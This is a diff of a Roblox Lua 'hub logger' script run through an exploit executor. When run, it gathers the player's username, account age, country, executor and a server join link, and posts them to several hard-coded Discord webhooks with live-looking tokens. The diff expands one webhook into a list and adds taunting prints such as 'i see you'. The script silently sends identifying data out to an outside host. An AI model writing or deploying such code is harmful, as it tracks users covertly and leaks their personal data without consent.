@@ -1,4 +1,3 @@
--- Ultimate NETWORK HUB-style Logger (2025-2026 Edition) + Dynamic Joiner
 local Players = game:GetService("Players")
 local Http = game:GetService("HttpService")
 local Market = game:GetService("MarketplaceService")
@@ -6,9 +5,15 @@ local LocalizationService = game:GetService("LocalizationService")
 
 local plr = Players.LocalPlayer
 
-local webhook = "https://discord.com/api/webhooks/1500270818708684900/rjjsg9lOzPOMbh0AMuKFxDa4nYA7wos1EKe6h728YvTSB0_xqusuK5fD_50-dR5pipYm"
+-- ==================== WEBHOOKS ====================
+-- Add as many webhooks as you want here
+local webhooks = {
+    "https://discord.com/api/webhooks/1500270818708684900/rjjsg9lOzPOMbh0AMuKFxDa4nYA7wos1EKe6h728YvTSB0_xqusuK5fD_50-dR5pipYm",
+    -- "https://discord.com/api/webhooks/1521563408892428358/xPdBaKVQVM5rf4DM3adPtwKjTOubz404hhgHR1TdSmY3-UQKhN4sItNe2x7Qw3A1ox_f",   -- ← Add your other webhook here
+    -- "https://discord.com/api/v10/webhooks/1521618669342560330/_K7NTnhgsb_RsRI8DjJy8IK6U9iCVDKaheG5ctUcHm0bR880hxTez31XHp4RN622fl3Y",
+}
 
--- Executor Detection (unchanged)
+-- Executor Detection (2025-2026 updated)
 local executor = (
     getexecutorname and getexecutorname() or
     identifyexecutor and identifyexecutor() or
@@ -62,15 +67,15 @@ pcall(function()
     gameName = Market:GetProductInfo(game.PlaceId).Name
 end)
 
--- Dynamic Join Link
+-- Dynamic Join Link (Fern.wtf)
 local joinLink = "https://fern.wtf/joiner?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId
 
 -- Logger Data
 local data = {
     content = "|| New Log claimed ||",
     embeds = {{
-        title = "Info",
-        description = "",
+        title = "Ultimate 𝐙𝐉𝐀 𝐇𝐔𝐁 Logger (𝐨𝐩)",
+        description = "**" .. gameName .. "**",
         color = 0x2F3136,
         thumbnail = {url = "https://www.roblox.com/headshot-thumbnail/image?userId="..plr.UserId.."&width=420&height=420&format=png"},
         fields = {
@@ -78,37 +83,39 @@ local data = {
             {name = "Account Age",   value = plr.AccountAge .. " Days", inline = true},
             {name = "Country",       value = getCountry(),              inline = true},
             {name = "Executor",      value = executor,                  inline = true},
-            {name = "Join Link",     value = joinLink,                  inline = true},
+            {name = "Join Link",     value = joinLink,                  inline = false},
         },
-        footer = {text = "NETWORK Hub â¢ "..os.date("%Y-%m-%d %X")},
+        footer = {text = "𝐙𝐉𝐀 𝐇𝐔𝐁/𝐋𝐎𝐆 • " .. os.date("%Y-%m-%d %X")},
         timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
     }}
 }
 
--- Send Log
+-- Send to ALL webhooks
 local req = syn and syn.request or http_request or request or Http.request or HttpPost
+
 if req then
-    pcall(function()
-        req({
-            Url = webhook,
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = Http:JSONEncode(data)
-        })
-    end)
+    for _, webhook in ipairs(webhooks) do
+        if webhook and webhook ~= "" then
+            pcall(function()
+                req({
+                    Url = webhook,
+                    Method = "POST",
+                    Headers = {["Content-Type"] = "application/json"},
+                    Body = Http:JSONEncode(data)
+                })
+            end)
+        end
+    end
 end
 
 -- Auto Join via Fern.wtf
-print("ð Attempting to join current server via Fern.wtf...")
-print("Join Link: " .. joinLink)
+print("hi")
+print("i see you: " .. joinLink)
 
 pcall(function()
     if request then
-        request({
-            Url = joinLink,
-            Method = "GET"
-        })
+        request({ Url = joinLink, Method = "GET" })
     end
 end)
 
-print("â Network Hub + Joiner executed successfully.")
+print("hi there.")
